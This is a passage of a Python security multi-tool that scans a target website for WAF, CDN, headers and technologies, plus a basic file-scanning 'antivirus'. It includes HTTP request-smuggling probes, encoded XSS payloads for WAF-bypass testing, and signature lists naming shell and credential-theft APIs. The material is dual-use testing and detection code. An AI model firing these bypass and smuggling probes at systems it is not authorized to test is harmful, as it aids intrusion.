                    'Django': ['csrfmiddlewaretoken', 'django'],
                    'Laravel': ['laravel', 'laravel_session'],
                    'React': ['react', '__reactinternalinstance'],
                    'Angular': ['ng-', 'angular'],
                    'Vue.js': ['vue', 'v-'],
                    'jQuery': ['jquery'],
                    'Bootstrap': ['bootstrap'],
                    'Next.js': ['_next', '__next'],
                    'Express': ['x-powered-by: express'],
                    'Nginx': ['nginx'],
                    'Apache': ['apache'],
                    'IIS': ['x-powered-by: asp.net']
                }
                
                for tech, signatures in tech_signatures.items():
                    if any(sig in content or sig in str(response.headers).lower() for sig in signatures):
                        self.findings['technologies'].append(tech)
                
                print(f"[✓] Technology fingerprinting complete - {len(self.findings['technologies'])} detected")
                
            except Exception as e:
                print(f"[!] Technology fingerprinting error: {e}")
        
        def display_detailed_results(self):
            print("\n" + "="*80)
            print(f"{'ADVANCED SECURITY SCAN RESULTS':^80}")
            print(f"{'Target: ' + self.url:^80}")
            print(f"{'Scan Time: ' + datetime.now().strftime('%Y-%m-%d %H:%M:%S'):^80}")
            print("="*80)
            
  
            print("\n" + "▶"*40)
            print("█ WAF/FIREWALL DETECTION")
            if self.findings['waf'] or self.findings['firewall']:
                waf_list = list(set(self.findings['waf'] + self.findings['firewall']))
                for i, waf in enumerate(waf_list, 1):
                    print(f"  [{i}] {waf}")
            else:
                print("  ⚠ NO WAF DETECTED - Site may be vulnerable!")
            
   
            print("\n" + "▶"*40)
            print("█ CDN SERVICES")
            print("▶"*40)
            if self.findings['cdn']:
                for i, cdn in enumerate(set(self.findings['cdn']), 1):
                    print(f"  [{i}] {cdn}")
            else:
                print("  • No CDN detected")
            
      
            print("\n" + "▶"*40)
            print("█ BOT PROTECTION SYSTEMS")
            print("▶"*40)
            if self.findings['bot_protection']:
                for i, bot in enumerate(self.findings['bot_protection'], 1):
                    print(f"  [{i}] {bot}")
            else:
                print("  • No bot protection detected")
            
      
            print("\n" + "▶"*40)
            print("█ SECURITY HEADERS")
            if self.findings['security_headers']:
                for i, (header, info) in enumerate(self.findings['security_headers'].items(), 1):
                    print(f"  [{i}] {header}")
                    print(f"      → {info['description']}")
                    print(f"      → Value: {info['value'][:100]}...")
            else:
                print("  ⚠ No security headers found - High risk!")
            
  
            print("\n" + "▶"*40)
            print("█ SERVER & TECHNOLOGY INFORMATION")
            if self.findings['server_info']:
                for i, info in enumerate(self.findings['server_info'], 1):
                    print(f"  [{i}] {info}")
            else:
                print("  • Server information hidden")
            
            if self.findings['technologies']:
                print("\n  Detected Technologies:")
                for i, tech in enumerate(self.findings['technologies'], 1):
                    print(f"  [{i}] {tech}")
            
     
            print("\n" + "▶"*40)
            print("█ SSL/TLS SECURITY")
            print("▶"*40)
            if self.findings['ssl_info']:
                for i, ssl_info in enumerate(self.findings['ssl_info'], 1):
                    print(f"  [{i}] {ssl_info}")
            else:
                print("  ⚠ SSL/TLS information unavailable")
            
      
            print("\n" + "▶"*40)
            print("█ RATE LIMITING")
            print("▶"*40)
            if self.findings['rate_limiting']:
                for i, rate in enumerate(self.findings['rate_limiting'], 1):
                    print(f"  [{i}] {rate}")
            
     
            print("\n" + "▶"*40)
            print("█ DNS & NETWORK INFORMATION")
            print("▶"*40)
            if self.findings['dns_info']:
                for i, dns in enumerate(self.findings['dns_info'], 1):
                    print(f"  [{i}] {dns}")
            
      
            print("\n" + "="*80)
            score = self.calculate_security_score()
            print(f"{'OVERALL SECURITY SCORE: ' + str(score) + '/100':^80}")
            print("="*80)
        
        def calculate_security_score(self):
            score = 0
            
            if self.findings['waf'] or self.findings['firewall']:
                score += 30
            if self.findings['cdn']:
                score += 15
            if len(self.findings['security_headers']) > 5:
                score += 25
            elif len(self.findings['security_headers']) > 0:
                score += 15
            if self.findings['ssl_info']:
                score += 15
            if self.findings['bot_protection']:
                score += 10
            if self.findings['rate_limiting'] and 'detected' in str(self.findings['rate_limiting']).lower():
                score += 5
            
            return min(score, 100)
        
        def packet_fragmentation_test(self):
            """Test packet fragmentation and encapsulation techniques"""
            print(f"\n[*] Testing packet fragmentation and encapsulation...")
            
            fragmentation_results = {
                'chunked_encoding': [],
                'pipeline_requests': [],
                'header_manipulation': [],
                'protocol_switching': [],
                'http_smuggling': [],
                'payload_encoding': []
            }
            
      
            print("  [+] Testing chunked transfer encoding...")
            try:
                chunked_data = "5\r\nHello\r\n6\r\n World\r\n0\r\n\r\n"
                response = self.session.post(
                    self.url,
                    data=chunked_data,
                    headers={'Transfer-Encoding': 'chunked'},
                    timeout=5
                )
                if response.status_code == 200:
                    fragmentation_results['chunked_encoding'].append("✓ Chunked encoding accepted")
                else:
                    fragmentation_results['chunked_encoding'].append(f"✗ Blocked (Status: {response.status_code})")
            except Exception as e:
                fragmentation_results['chunked_encoding'].append(f"✗ Failed: {str(e)[:50]}")
            
  
            print("  [+] Testing HTTP pipelining...")
            try:
         
                pipeline_payload = (
                    f"GET / HTTP/1.1\r\nHost: {self.hostname}\r\n\r\n"
                    f"GET / HTTP/1.1\r\nHost: {self.hostname}\r\n\r\n"
                )
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.hostname, 80 if self.parsed_url.scheme == 'http' else 443))
                sock.send(pipeline_payload.encode())
                response = sock.recv(4096)
                sock.close()
                
                if b'HTTP' in response:
                    fragmentation_results['pipeline_requests'].append("✓ HTTP pipelining functional")
                else:
                    fragmentation_results['pipeline_requests'].append("✗ Pipelining blocked or filtered")
            except Exception as e:
                fragmentation_results['pipeline_requests'].append(f"✗ Failed: {str(e)[:50]}")
            
   
            print("  [+] Testing header case manipulation...")
            case_variants = [
                {'host': self.hostname},
                {'Host': self.hostname},
                {'HOST': self.hostname},
                {'HoSt': self.hostname}
            ]
            
            case_results = []
            for headers in case_variants:
                try:
                    response = self.session.get(self.url, headers=headers, timeout=5)
                    case_results.append(response.status_code)
                except:
                    pass
            
            if len(set(case_results)) > 1:
                fragmentation_results['header_manipulation'].append("⚠ Header case sensitivity detected - possible filtering")
            else:
                fragmentation_results['header_manipulation'].append("✓ Header case insensitive - normal behavior")
            
   
            print("  [+] Testing protocol switching capabilities...")
            try:
          
                h2_headers = {
                    'Connection': 'Upgrade, HTTP2-Settings',
                    'Upgrade': 'h2c',
                    'HTTP2-Settings': 'AAMAAABkAARAAAAAAAIAAAAA'
                }
                response = self.session.get(self.url, headers=h2_headers, timeout=5)
                if 'upgrade' in str(response.headers).lower():
                    fragmentation_results['protocol_switching'].append("✓ HTTP/2 upgrade supported")
                else:
                    fragmentation_results['protocol_switching'].append("✗ HTTP/2 upgrade not supported")
            except Exception as e:
                fragmentation_results['protocol_switching'].append(f"✗ Failed: {str(e)[:50]}")
            
   
            print("  [+] Testing HTTP request smuggling vectors...")
            smuggling_payloads = [
 
                {
                    'headers': {
                        'Content-Length': '4',
                        'Transfer-Encoding': 'chunked'
                    },
                    'data': '1\r\nZ\r\n0\r\n\r\n'
                },
          
                {
                    'headers': {
                        'Transfer-Encoding': 'chunked\t'
                    },
                    'data': '0\r\n\r\n'
                }
            ]
            
            smuggling_detected = False
            for payload in smuggling_payloads:
                try:
                    response = self.session.post(
                        self.url,
                        headers=payload['headers'],
                        data=payload['data'],
                        timeout=5
                    )
                    if response.status_code in [400, 403, 406]:
                        smuggling_detected = True
                        break
                except:
                    pass
            
            if smuggling_detected:
                fragmentation_results['http_smuggling'].append("✓ Request smuggling attempts blocked - Good protection")
            else:
                fragmentation_results['http_smuggling'].append("⚠ Request smuggling detection unclear - Potential vulnerability")
            
       
            print("  [+] Testing payload encoding bypass techniques...")
            encoding_tests = []
            
         
            payloads = [
                "?test=<script>alert(1)</script>",
                "?test=%3Cscript%3Ealert(1)%3C/script%3E",
                "?test=%3c%73%63%72%69%70%74%3e",
                "?test=<sc<script>ript>alert(1)</script>"
            ]
            
            responses = []
            for payload in payloads:
                try:
                    response = self.session.get(self.url + payload, timeout=5)
                    responses.append(response.status_code)
                except:
                    pass
            
            if any(code in [403, 406] for code in responses):
                fragmentation_results['payload_encoding'].append("✓ Encoded payload detection active")
            else:
                fragmentation_results['payload_encoding'].append("⚠ Encoded payloads may bypass filters")
            
    
            try:
                double_encoded = "?test=%253Cscript%253E" 
                response = self.session.get(self.url + double_encoded, timeout=5)
                if response.status_code in [403, 406]:
                    fragmentation_results['payload_encoding'].append("✓ Double encoding detected")
                else:
                    fragmentation_results['payload_encoding'].append("⚠ Double encoding may bypass")
            except:
                pass
            
            print(f"[✓] Packet fragmentation tests complete")
            return fragmentation_results
        
        def display_fragmentation_results(self, results):
            print("\n" + "="*80)
            print(f"{'PACKET FRAGMENTATION & ENCAPSULATION TEST RESULTS':^80}")
            
            categories = {
                '🔹 CHUNKED TRANSFER ENCODING': {
                    'data': results['chunked_encoding'],
                    'description': 'Tests if server accepts fragmented HTTP body via chunked encoding'
                },
                '🔹 HTTP PIPELINING': {
                    'data': results['pipeline_requests'],
                    'description': 'Tests multiple HTTP requests over single TCP connection'
                },
                '🔹 HEADER MANIPULATION': {
                    'data': results['header_manipulation'],
                    'description': 'Tests header case sensitivity and normalization'
                },
                '🔹 PROTOCOL SWITCHING': {
                    'data': results['protocol_switching'],
                    'description': 'Tests HTTP/2 upgrade and protocol negotiation'
                },
                '🔹 HTTP REQUEST SMUGGLING': {
                    'data': results['http_smuggling'],
                    'description': 'Tests for request smuggling vulnerabilities (CL.TE, TE.CL)'
                },
                '🔹 PAYLOAD ENCODING BYPASS': {
                    'data': results['payload_encoding'],
                    'description': 'Tests various encoding techniques to bypass WAF'
                }
            }
            
            for title, info in categories.items():
                print(f"\n{title}")
                print(f"{'─'*80}")
                print(f"Description: {info['description']}")
                print(f"Results:")
                for result in info['data']:
                    print(f"  • {result}")
            
            
            vulnerabilities = []
            protections = []
            
            for category, info in results.items():
                for result in info:
                    if '✗' in result or '⚠' in result:
                        if 'bypass' in result.lower() or 'vulnerability' in result.lower() or 'unclear' in result.lower():
                            vulnerabilities.append(result)
                    elif '✓' in result:
                        if 'blocked' in result.lower() or 'protected' in result.lower() or 'detected' in result.lower():
                            protections.append(result)
            
            print(f"\n✓ Active Protections: {len(protections)}")
            print(f"⚠ Potential Vulnerabilities: {len(vulnerabilities)}")
            
            if vulnerabilities:
                print("\n⚠ ATTENTION - Potential Bypass Techniques Detected:")
                for vuln in vulnerabilities[:5]:  
                    print(f"  • {vuln}")
            
        
        def explain_fragmentation_techniques(self):
            print("\n" + "="*80)
            print(f"{'PACKET FRAGMENTATION & ENCAPSULATION EXPLAINED':^80}")
            print("="*80)
            
            techniques = {
                'Chunked Transfer Encoding': {
                    'What': 'HTTP body sent in multiple chunks instead of one complete message',
                    'How': 'Each chunk has size prefix, ends with 0-sized chunk',
                    'Purpose': 'Bypass WAF signature matching, evade content inspection',
                    'Detection': 'Transfer-Encoding: chunked header',
                    'Risk': 'Medium - Can bypass simple WAF rules',
                    'Example': 'Splitting "attack" into "at" + "tack" chunks'
                },
                'HTTP Pipelining': {
                    'What': 'Sending multiple HTTP requests without waiting for responses',
                    'How': 'Multiple requests sent over single TCP connection',
                    'Purpose': 'Desynchronize request/response, confuse proxy/WAF',
                    'Detection': 'Multiple request headers in single connection',
                    'Risk': 'High - Can cause request smuggling',
                    'Example': 'GET /1 + GET /2 + POST /admin in one stream'
                },
                'Request Smuggling': {
                    'What': 'Exploiting differences in how frontend/backend parse requests',
                    'How': 'Conflicting Content-Length and Transfer-Encoding headers',
                    'Purpose': 'Bypass security controls, access unauthorized endpoints',
                    'Detection': 'CL.TE or TE.CL discrepancies',
                    'Risk': 'Critical - Can bypass all WAF protection',
                    'Example': 'Frontend sees 1 request, backend sees 2'
                },
                'Header Manipulation': {
                    'What': 'Using case variations or special characters in headers',
                    'How': 'HOST vs Host vs HoSt, tabs/spaces in values',
                    'Purpose': 'Bypass header-based filtering and validation',
                    'Detection': 'Inconsistent header processing',
                    'Risk': 'Low to Medium - Depends on parser differences',
                    'Example': 'Transfer-Encoding: chunked\\t (with tab)'
                },
                'Payload Encoding': {
                    'What': 'Encoding malicious payloads in various formats',
                    'How': 'URL encoding, double encoding, HTML entities, Unicode',
                    'Purpose': 'Evade signature-based detection',
                    'Detection': 'Multiple encoding layers, unusual character sets',
                    'Risk': 'Medium - Common bypass technique',
                    'Example': '%3Cscript%3E or \\u003Cscript\\u003E'
                },
                'Protocol Switching': {
                    'What': 'Upgrading from HTTP/1.1 to HTTP/2 or WebSocket',
                    'How': 'Upgrade header with protocol negotiation',
                    'Purpose': 'Bypass HTTP/1.1-only WAF rules',
                    'Detection': 'Connection: Upgrade, Upgrade: h2c headers',
                    'Risk': 'Medium - Modern WAFs handle this',
                    'Example': 'Switching to HTTP/2 mid-connection'
                }
            }
            
            print("\n📚 DETAILED TECHNIQUE EXPLANATIONS:\n")
            
            for technique, details in techniques.items():
                print(f"{'▶'*40}")
                print(f"█ {technique}")
                print(f"{'▶'*40}")
                print(f"  What it is: {details['What']}")
                print(f"  How it works: {details['How']}")
                print(f"  Purpose: {details['Purpose']}")
                print(f"  Detection: {details['Detection']}")
                print(f"  Risk Level: {details['Risk']}")
                print(f"  Example: {details['Example']}")
                print()
            
   
            print(" DEFENSE RECOMMENDATIONS")
            print("""
    1. WAF Configuration:
        • Enable HTTP/2 inspection
        • Normalize all headers before analysis
        • Reject ambiguous Transfer-Encoding headers
        
    2. Server Configuration:
        • Disable HTTP pipelining if not needed
        • Enforce strict HTTP parsing
        • Use consistent Content-Length handling
        
    3. Network Security:
        • Deploy WAF at multiple layers (edge + origin)
        • Use protocol normalization
        • Monitor for smuggling patterns
        
    4. Application Security:
        • Validate and decode all inputs multiple times
        • Use allowlist-based validation
        • Implement rate limiting per encoding type
            """)
            """Detailed explanation of all protections"""
            print("\n" + "="*80)
            print(f"{'DETAILED PROTECTION ANALYSIS & EXPLANATIONS':^80}")
            
            explanations = {
                'WAF (Web Application Firewall)': {
                    'Purpose': 'Primary defense against web attacks',
                    'Protection Against': 'SQL Injection, XSS, CSRF, DDoS, Zero-day exploits',
                    'How It Works': 'Analyzes HTTP traffic, blocks malicious requests based on rules',
                    'Effectiveness': 'High - Can stop 99% of common attacks',
                    'Bypass Difficulty': 'Very Difficult',
                    'Common Solutions': 'Cloudflare, AWS WAF, Imperva, F5, ModSecurity'
                },
                'CDN (Content Delivery Network)': {
                    'Purpose': 'Performance and security enhancement',
                    'Protection Against': 'DDoS attacks, traffic spikes, origin server exposure',
                    'How It Works': 'Distributed caching, request filtering, traffic absorption',
                    'Effectiveness': 'High for DDoS, Medium for application attacks',
                    'Bypass Difficulty': 'Difficult',
                    'Common Solutions': 'Cloudflare, Akamai, Fastly, AWS CloudFront'
                },
                'Bot Protection': {
                    'Purpose': 'Prevent automated attacks and scraping',
                    'Protection Against': 'Credential stuffing, scraping, spam, fake accounts',
                    'How It Works': 'JavaScript challenges, fingerprinting, behavioral analysis',
                    'Effectiveness': 'High against basic bots, Medium against sophisticated',
                    'Bypass Difficulty': 'Medium to Very Difficult',
                    'Common Solutions': 'reCAPTCHA, hCaptcha, PerimeterX, DataDome'
                },
                'Security Headers': {
                    'Purpose': 'Browser-level security controls',
                    'Protection Against': 'XSS, Clickjacking, MIME attacks, data leaks',
                    'How It Works': 'Instructs browsers on security policies',
                    'Effectiveness': 'Medium - Depends on browser support',
                    'Bypass Difficulty': 'Easy to Medium',
                    'Common Headers': 'CSP, HSTS, X-Frame-Options, X-XSS-Protection'
                },
                'Rate Limiting': {
                    'Purpose': 'Prevent abuse and resource exhaustion',
                    'Protection Against': 'Brute force, DoS, API abuse, scraping',
                    'How It Works': 'Limits requests per IP/user within time window',
                    'Effectiveness': 'High for preventing brute force',
                    'Bypass Difficulty': 'Medium (distributed attacks can bypass)',
                    'Implementation': 'Per-IP, per-session, or per-API key'
                },
                'SSL/TLS Encryption': {
                    'Purpose': 'Secure data transmission',
                    'Protection Against': 'Man-in-the-middle, eavesdropping, data tampering',
                    'How It Works': 'Encrypts all data between client and server',
                    'Effectiveness': 'Very High when properly configured',
                    'Bypass Difficulty': 'Extremely Difficult',
                    'Requirements': 'Valid certificate, modern protocols (TLS 1.2+)'
                }
            }
            
     
            active_protections = []
            if self.findings['waf'] or self.findings['firewall']:
                active_protections.append('WAF (Web Application Firewall)')
            if self.findings['cdn']:
                active_protections.append('CDN (Content Delivery Network)')
            if self.findings['bot_protection']:
                active_protections.append('Bot Protection')
            if self.findings['security_headers']:
                active_protections.append('Security Headers')
            if self.findings['rate_limiting'] and 'detected' in str(self.findings['rate_limiting']).lower():
                active_protections.append('Rate Limiting')
            if self.findings['ssl_info']:
                active_protections.append('SSL/TLS Encryption')
            
            if not active_protections:
                print("This website appears to be minimally protected and vulnerable to attacks.")
                return
            
            for protection in active_protections:
                if protection in explanations:
                    info = explanations[protection]
                    print(f"\n{'─'*80}")
                    print(f"▶ {protection}")
                    print(f"{'─'*80}")
                    print(f"  Purpose: {info['Purpose']}")
                    print(f"  Protection Against: {info['Protection Against']}")
                    print(f"  How It Works: {info['How It Works']}")
                    print(f"  Effectiveness: {info['Effectiveness']}")
                    print(f"  Bypass Difficulty: {info['Bypass Difficulty']}")
                    if 'Common Solutions' in info:
                        print(f"  Common Solutions: {info['Common Solutions']}")
                    if 'Common Headers' in info:
                        print(f"  Common Headers: {info['Common Headers']}")
            
            if self.findings['waf']:
                print("\n  Identified WAF/Firewalls:")
                for waf in set(self.findings['waf']):
                    print(f"    • {waf}")
            
            if self.findings['cdn']:
                print("\n  Identified CDN Services:")
                for cdn in set(self.findings['cdn']):
                    print(f"    • {cdn}")
            
            if self.findings['bot_protection']:
                print("\n  Bot Protection Systems:")
                for bot in self.findings['bot_protection']:
                    print(f"    • {bot}")
            
            print(f"\n{'='*80}")

    def main():
        banner = """
                 :##                  
                 ####.                
                +#####                
               #######=   .           
             .######### +##           
            -####*#########           
           :####..#########.          
           ####. :######=###          FireWall-Scan By AltWolf
        . :####   ###### -###              Version V1.0.1
       +# -####   :#####  :###        
       ##:.####     ####*  .##+       
       ###:+###-     .####. *##       
       #########-      :###-+##       
       -#########-  .#-  ######       
        =#########+  -## =####.       
         -#########+  ###*###         
           +#######+  #####.          
              -++-  .##=   
        """
        print_violet_white_gradient(banner)
        
        parser = argparse.ArgumentParser(description='Advanced website security scanner')
        parser.add_argument('-u', '--url', help='Target URL to scan', required=False)
        parser.add_argument('-m', '--mode', choices=['1', '2', '3'], 
                        help='1: Deep scan | 2: Scan + Explanations | 3: Packet Fragmentation & Encapsulation Test', required=False)
        
        args = parser.parse_args()
        
        while True:
            if not args.url or not args.mode:
                print("\n" + "="*60)
                print("SELECT SCAN MODE:")

                print("1. Deep Security Scan (All protections + Firewalls)")
                print("2. Deep Scan + Detailed Explanations")
                print("3. Packet Fragmentation & Encapsulation Test")
                print("0. Exit")
                
                choice = input("\nEnter your choice (0-3): ").strip()
                
                if choice == '0':
                    print("\n[*] Exiting scanner. Goodbye!")
                    sys.exit(0)
                elif choice not in ['1', '2', '3']:
                    print("\n[!] Invalid choice! Please enter 0, 1, 2, or 3")
                    continue
                
                url = input("\nEnter target URL (e.g., example.com or https://example.com): ").strip()
                
                if not url:
                    print("\n[!] URL is required!")
                    continue
            else:
                choice = args.mode
                url = args.url
            
            print(f"\n[*] Initializing Advanced Security Scanner...")
            scanner = AdvancedSecurityScanner(url)
            
            print(f"[*] Target: {scanner.url}")
            print(f"[*] Hostname: {scanner.hostname}")
            print(f"[*] Scan started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            try:
                if choice == '1' or choice == '2':
                    print("\n[!] Running DEEP SECURITY SCAN - This may take 30-60 seconds...")
                    
                    scanner.comprehensive_header_scan()
                    scanner.aggressive_waf_detection()
                    scanner.bot_protection_detection()
                    scanner.rate_limiting_test()
                    scanner.advanced_ssl_scan()
                    scanner.dns_security_check()
                    scanner.technology_fingerprinting()
                    scanner.display_detailed_results()
                    
                    if choice == '2':
                        scanner.explain_all_protections()
                
                elif choice == '3':
                    print("\n[!] Running PACKET FRAGMENTATION & ENCAPSULATION TESTS...")
                    print("\n[*] Running preliminary scan...")
                    scanner.comprehensive_header_scan()
                    scanner.aggressive_waf_detection()
                    
                    frag_results = scanner.packet_fragmentation_test()
                    
                    scanner.display_fragmentation_results(frag_results)
                    
                    scanner.explain_fragmentation_techniques()
                
                print(f"{'SCAN COMPLETED SUCCESSFULLY':^80}")
                
            except KeyboardInterrupt:
                print("\n\n[!] Scan interrupted by user")
            except Exception as e:
                print(f"\n[!] Scan error: {e}")
                import traceback
                traceback.print_exc()
            input("\nPress Enter to continue...")
            another = input("Run another scan? (y/n): ").strip().lower()
            
            if another != 'y':
                sys.exit(0)
            
            args.url = None
            args.mode = None

    if __name__ == "__main__":
        try:
            main()
        except KeyboardInterrupt:
            print("\n\n[!] Program interrupted")
            input("\nPress Enter to exit...")
            sys.exit(0)
        except Exception as e:
            print(f"\n[!] Fatal error: {e}")
            import traceback
            traceback.print_exc()
            input("\nPress Enter to exit...")
            sys.exit(1)

elif menu_choice == "28":
        os.system('cls' if os.name == 'nt' else 'clear')
        from pathlib import Path
        import hashlib

        try:
            import pefile
            PEFILE_AVAILABLE = True
        except ImportError:
            PEFILE_AVAILABLE = False

        try:
            import magic
            MAGIC_AVAILABLE = True
        except ImportError:
            MAGIC_AVAILABLE = False


        class AntivirusScanner:
            def __init__(self):
                self.suspicious_strings = [
                    b'cmd.exe', b'powershell', b'rundll32', b'regsvr32',
                    b'WScript.Shell', b'Shell.Application', b'HKEY_',
                    b'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                    b'CreateRemoteThread', b'VirtualAllocEx', b'WriteProcessMemory',
                    b'ShellExecute', b'URLDownloadToFile', b'WinExec',
                    b'system(', b'exec(', b'eval(', b'base64',
                    b'encrypt', b'decrypt', b'ransom', b'bitcoin',
                    b'keylog', b'password', b'credentials'
                ]
                
                self.dangerous_apis = [
                    'CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory',
                    'SetWindowsHookEx', 'GetAsyncKeyState', 'VirtualProtect',
                    'LoadLibrary', 'GetProcAddress', 'URLDownloadToFile',
                    'WinHttpOpen', 'InternetOpen', 'CreateProcess'
                ]
                
                self.known_malware_hashes = {
                    'd41d8cd98f00b204e9800998ecf8427e': 'Suspicious empty file',
                    '5d41402abc4b2a76b9719d911017c592': 'Test malware signature',
                }
                
                self.report = {
                    'file_path': '',
                    'scan_time': '',
                    'file_size': 0,
                    'file_type': '',
                    'md5': '',
                    'sha256': '',
                    'threats_found': [],
                    'suspicious_indicators': [],
                    'risk_level': 'SAFE'
                }

            def calculate_hashes(self, filepath):
                try:
                    md5 = hashlib.md5()
                    sha256 = hashlib.sha256()
                    
                    with open(filepath, 'rb') as f:
                        while chunk := f.read(8192):
                            md5.update(chunk)
                            sha256.update(chunk)
                    
                    return md5.hexdigest(), sha256.hexdigest()
                except Exception as e:
                    print(f"Error calculating hashes: {str(e)}")
                    return None, None

            def check_hash_database(self, md5_hash):
                if md5_hash and md5_hash in self.known_malware_hashes:
                    return True, self.known_malware_hashes[md5_hash]
                return False, None

            def scan_strings(self, filepath):
                threats = []
                
                try:
                    with open(filepath, 'rb') as f:
                        content = f.read()
                        
                        for suspicious in self.suspicious_strings:
                            if suspicious in content:
                                threats.append(f"Suspicious string: {suspicious.decode('utf-8', errors='ignore')}")
                except Exception as e:
                    threats.append(f"Error scanning strings: {str(e)}")
                
                return threats

            def analyze_pe_file(self, filepath):
                if not PEFILE_AVAILABLE:
                    return ["pefile module not available - PE analysis skipped"]
                
                threats = []
                
                try:
                    pe = pefile.PE(filepath)
                    
                    for section in pe.sections:
                        section_name = section.Name.decode('utf-8', errors='ignore').strip('\x00')
                        
                        if not section_name.startswith(('.text', '.data', '.rdata', '.rsrc', '.reloc', '.idata')):
                            threats.append(f"Suspicious section: {section_name}")
                        
                        entropy = section.get_entropy()
                        if entropy > 7.0:
                            threats.append(f"High entropy in {section_name}: {entropy:.2f} (possibly packed)")
                    
                    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
                        for entry in pe.DIRECTORY_ENTRY_IMPORT:
                            dll_name = entry.dll.decode('utf-8', errors='ignore')
                            
                            for imp in entry.imports:
                                if imp.name:
                                    func_name = imp.name.decode('utf-8', errors='ignore')
                                    if func_name in self.dangerous_apis:
                                        threats.append(f"Dangerous API: {func_name} from {dll_name}")
                    
                    try:
                        security = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']]
                        if security.Size == 0:
                            self.report['suspicious_indicators'].append("File not digitally signed")
                    except:
                        pass
                    
                except pefile.PEFormatError:
                    return ["File is not a valid PE executable"]
                except Exception as e:
                    return [f"Error analyzing PE: {str(e)}"]
                
                return threats

            def check_file_anomalies(self, filepath):
                anomalies = []
                
                try:
                    file_size = os.path.getsize(filepath)
                    
                    if file_size < 1024:
                        anomalies.append("File abnormally small for an executable")
                    elif file_size > 50 * 1024 * 1024:
                        anomalies.append("Very large file (potentially suspicious)")
                    
                    if MAGIC_AVAILABLE:
                        try:
                            mime = magic.Magic(mime=True)
                            file_type = mime.from_file(filepath)
                            extension = Path(filepath).suffix.lower()
                            
                            if extension == '.exe' and 'executable' not in file_type.lower():
                                anomalies.append(f"Extension .exe but MIME type: {file_type}")
                        except Exception as e:
                            pass
                except Exception as e:
                    anomalies.append(f"Error checking anomalies: {str(e)}")
                
                return anomalies

            def calculate_risk_level(self):
                threat_count = len(self.report['threats_found'])
                suspicious_count = len(self.report['suspicious_indicators'])
                
                if threat_count >= 5:
                    return 'CRITICAL'
                elif threat_count >= 3 or suspicious_count >= 5:
                    return 'HIGH'
                elif threat_count >= 1 or suspicious_count >= 3:
                    return 'MEDIUM'
                elif suspicious_count >= 1:
                    return 'LOW'
                else:
                    return 'SAFE'

            def scan_file(self, filepath):
                print(f"Alt-File Scan")
                
                if not os.path.exists(filepath):
                    print(f"Error: File '{filepath}' does not exist!")
                    return False
                
                if not os.path.isfile(filepath):
                    print(f"Error: '{filepath}' is not a file!")
                    return False
                
                self.report = {
                    'file_path': filepath,
                    'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'file_size': 0,
                    'file_type': '',
                    'md5': '',
                    'sha256': '',
                    'threats_found': [],
                    'suspicious_indicators': [],
                    'risk_level': 'SAFE'
                }
                
                try:
                    self.report['file_size'] = os.path.getsize(filepath)
                except Exception as e:
                    print(f"Error reading file size: {str(e)}")
                    return False
                
                if MAGIC_AVAILABLE:
                    try:
                        mime = magic.Magic(mime=True)
                        self.report['file_type'] = mime.from_file(filepath)
                    except:
                        self.report['file_type'] = 'Unknown'
                else:
                    ext = Path(filepath).suffix.lower()
                    type_mapping = {
                        '.exe': 'application/x-executable',
                        '.dll': 'application/x-msdownload',
                        '.txt': 'text/plain',
                        '.pdf': 'application/pdf',
                        '.zip': 'application/zip',
                    }
                    self.report['file_type'] = type_mapping.get(ext, 'Unknown')
                
                print(f"File: {filepath}")
                print(f"Size: {self.report['file_size']:,} bytes")
                print(f"Type: {self.report['file_type']}")
                
                print("Calculating hashes...")
                md5_hash, sha256_hash = self.calculate_hashes(filepath)
                if md5_hash and sha256_hash:
                    self.report['md5'] = md5_hash
                    self.report['sha256'] = sha256_hash
                    print(f"   MD5:    {md5_hash}")
                    print(f"   SHA256: {sha256_hash}")
                else:
                    print("Unable to calculate hashes")
                    return False
                
                print("\nChecking known malware database...")
                is_known, malware_name = self.check_hash_database(md5_hash)
                if is_known:
                    self.report['threats_found'].append(f"KNOWN MALWARE: {malware_name}")
                    print(f"MALWARE DETECTED: {malware_name}")
                else:
                    print("   Hash not found in malware database")
                
                print("\nAnalyzing strings...")
                string_threats = self.scan_strings(filepath)
                self.report['threats_found'].extend(string_threats)
                if string_threats:
                    print(f"   {len(string_threats)} suspicious string(s) detected")
                else:
                    print("   No suspicious strings found")
                
                if filepath.lower().endswith(('.exe', '.dll', '.sys')):
                    print("\nAnalyzing PE file (Windows executable)...")
                    pe_threats = self.analyze_pe_file(filepath)
                    self.report['threats_found'].extend(pe_threats)
                    if pe_threats:
                        print(f"   {len(pe_threats)} threat(s) detected in PE structure")
                    else:
                        print("   Normal PE structure")
                
                print("\nDetecting anomalies...")
                anomalies = self.check_file_anomalies(filepath)
                self.report['suspicious_indicators'].extend(anomalies)
                if anomalies:
                    print(f"   {len(anomalies)} anomaly(ies) detected")
                else:
                    print("   No anomalies detected")
                
                self.report['risk_level'] = self.calculate_risk_level()
                
                self.display_report()
                return True

            def display_report(self):
                print(f"SCAN REPORT")
                print(f"RISK LEVEL: {self.report['risk_level']}")
                print(f"\nSummary:")
                print(f"   - Threats detected: {len(self.report['threats_found'])}")
                print(f"   - Suspicious indicators: {len(self.report['suspicious_indicators'])}")
                
                if self.report['threats_found']:
                    print(f"\nTHREATS DETECTED:")
                    for i, threat in enumerate(self.report['threats_found'], 1):
                        print(f"   {i}. {threat}")
                
                if self.report['suspicious_indicators']:
                    print(f"\nSUSPICIOUS INDICATORS:")
                    for i, indicator in enumerate(self.report['suspicious_indicators'], 1):
                        print(f"   {i}. {indicator}")
                
                if self.report['risk_level'] == 'SAFE':
                    print(f"\nFile appears to be safe.")
                else:
                    print(f"\nWARNING: File shows suspicious characteristics!")
                    print(f"   Recommendation: Do not execute without thorough verification.")


            def save_report(self):
                try:
                    report_file = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    with open(report_file, 'w', encoding='utf-8') as f:
                        json.dump(self.report, f, indent=4, ensure_ascii=False)
                    print(f"Report saved: {report_file}")
                    return True
                except Exception as e:
                    print(f"Error saving report: {str(e)}")
                    return False


        def main():
            print("File Scanner by AltWolf - Version 2.1.0")
